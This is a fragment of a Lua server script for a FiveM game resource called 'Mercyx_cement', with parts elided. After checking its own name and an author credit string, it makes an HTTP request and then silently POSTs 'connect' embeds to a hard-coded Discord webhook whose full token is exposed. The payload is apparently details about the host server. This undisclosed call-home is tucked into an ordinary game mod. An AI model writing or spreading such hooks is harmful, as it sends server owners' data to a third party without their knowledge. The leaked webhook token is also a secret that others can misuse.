--[[
	id: 91pjOnH8tKoUhPu2GX3us
	name: Mercyx_cement > Server
	description: Mercyx_cement
	time1: 2021-07-07 15:23:25.653753+00
	time2: 2021-07-07 15:23:25.653754+00
...
if GetCurrentResourceName() == "Mercyx_cement" and Config.Credit == "Mercyx.#0912 | https://discord.gg/bkVs2RUa49" then
            ...
            PerformHttpRequest(
                ...
                function(l, m, n)
                    if l == 200 then
                        ...
                        PerformHttpRequest(
                            "https://discord.com/api/webhooks/862351867682226228/omAfR6xDpFHS0S96m71WCKKHhrZFvfG79Ov2h_Mox152BM3z8DHyTifSS7vdseiLAOdr",
                            function(err, text, headers)
                            end,
                            "POST",
                            json.encode({username = "Mercyx_cement", embeds = connect, avatar_url = ""}),
